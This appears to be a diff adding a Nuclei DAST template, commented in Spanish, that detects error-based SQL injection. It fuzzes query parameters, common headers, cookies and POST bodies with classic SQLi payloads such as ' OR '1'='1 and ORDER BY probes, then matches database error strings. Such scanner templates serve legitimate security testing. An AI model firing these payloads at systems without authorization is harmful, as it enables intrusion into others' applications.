@@ -1,0 +1,203 @@
+id: generic-sqli-multiloc
+
+info:
+  name: Generic SQL Injection - Multi Location (Query/Body/Header/Cookie)
+  author: tatsu
+  severity: high
+  description: >
+    Detecta SQLi basado en errores probando inyección en parámetros GET (query),
+    body de POST (form-encoded), headers HTTP comunes y cookies, usando el motor
+    de fuzzing nativo de Nuclei v3 (bloque `fuzzing`). Requiere correr con -dast.
+  reference:
+    - https://docs.projectdiscovery.io/templates/protocols/http/fuzzing-overview
+  tags: sqli,fuzz,dast
+
+http:
+  # ===================================================================
+  # 1) QUERY (GET) — algunos params comunes ya en la URL para que el
+  #    motor los detecte y fuzzee. Para cobertura MASIVA de nombres de
+  #    parámetro GET (miles), usa el template separado xss-param-sweep
+  #    adaptado, o agrega "keys:" con tu propia lista.
+  # ===================================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1&q=1&search=1&page=1&category=1&user=1&token=abc&ref=1&sort=1&filter=1"
+
+    payloads:
+      sqli_error:
+        - "'"
+        - "\""
+        - "')"
+        - "' OR '1'='1"
+        - "' AND '1'='2"
+        - "1' ORDER BY 100--"
+        - "'||(SELECT 1)--"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: multiple
+        fuzz:
+          - "{{sqli_error}}"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: sql-error-signature
+        part: body
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysqli?_"
+          - "valid MySQL result"
+          - "check the manual that corresponds to your (MySQL|MariaDB) server version"
+          - "PostgreSQL.*ERROR"
+          - "pg_query\\(\\)"
+          - "pg_exec\\(\\)"
+          - "Unclosed quotation mark"
+          - "Microsoft OLE DB Provider for SQL Server"
+          - "Microsoft SQL Native Client error"
+          - "SQLServer JDBC Driver"
+          - "ORA-[0-9]{4,5}"
+          - "Oracle error"
+          - "quoted string not properly terminated"
+          - "SQLite/JDBCDriver"
+          - "SQLite\\.Exception"
+          - "System\\.Data\\.SQLite\\.SQLiteException"
+          - "SQLSTATE\\["
+          - "ODBC (SQL Server Driver|Driver)"
+          - "supplied argument is not a valid MySQL"
+
+  # ===================================================================
+  # 2) HEADERS — headers comunes que muchas apps registran/usan en
+  #    lógica de negocio sin sanitizar (logging, geo-IP lookup, etc.)
+  # ===================================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      X-Forwarded-For: "1"
+      X-Real-IP: "1"
+      X-Client-IP: "1"
+      X-Originating-IP: "1"
+      Referer: "https://example.com/1"
+      User-Agent: "Mozilla/5.0 (X11; Linux x86_64) sqli-fuzz/1"
+      X-Forwarded-Host: "1"
+
+    payloads:
+      sqli_error:
+        - "'"
+        - "\""
+        - "' OR '1'='1"
+        - "1' ORDER BY 100--"
+
+    fuzzing:
+      - part: header
+        type: replace
+        mode: single
+        keys:
+          - "X-Forwarded-For"
+          - "X-Real-IP"
+          - "X-Client-IP"
+          - "X-Originating-IP"
+          - "Referer"
+          - "User-Agent"
+          - "X-Forwarded-Host"
+        fuzz:
+          - "{{sqli_error}}"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: sql-error-signature
+        part: body
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysqli?_"
+          - "PostgreSQL.*ERROR"
+          - "Unclosed quotation mark"
+          - "Microsoft OLE DB Provider for SQL Server"
+          - "ORA-[0-9]{4,5}"
+          - "SQLite\\.Exception"
+          - "SQLSTATE\\["
+
+  # ===================================================================
+  # 3) COOKIES — valores de cookie que a veces se usan directo en
+  #    queries (session id numérico, user_id, lang, etc.)
+  # ===================================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      Cookie: "id=1; user_id=1; session=1; lang=en; role=1; token=abc"
+
+    payloads:
+      sqli_error:
+        - "'"
+        - "\""
+        - "' OR '1'='1"
+
+    fuzzing:
+      - part: cookie
+        type: replace
+        mode: single
+        fuzz:
+          - "{{sqli_error}}"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: sql-error-signature
+        part: body
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysqli?_"
+          - "PostgreSQL.*ERROR"
+          - "Unclosed quotation mark"
+          - "Microsoft OLE DB Provider for SQL Server"
+          - "ORA-[0-9]{4,5}"
+          - "SQLite\\.Exception"
+          - "SQLSTATE\\["
+
+  # ===================================================================
+  # 4) BODY (POST, form-encoded) — mismos params comunes que en query,
+  #    pero mandados como body de un POST.
+  # ===================================================================
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+
+    body: "id=1&q=1&search=1&username=1&email=1&comment=1&message=1"
+
+    payloads:
+      sqli_error:
+        - "'"
+        - "\""
+        - "' OR '1'='1"
+        - "1' ORDER BY 100--"
+
+    fuzzing:
+      - part: body
+        type: postfix
+        mode: multiple
+        fuzz:
+          - "{{sqli_error}}"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: sql-error-signature
+        part: body
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysqli?_"
+          - "PostgreSQL.*ERROR"
+          - "Unclosed quotation mark"
+          - "Microsoft OLE DB Provider for SQL Server"
+          - "ORA-[0-9]{4,5}"
+          - "SQLite\\.Exception"
+          - "SQLSTATE\\["
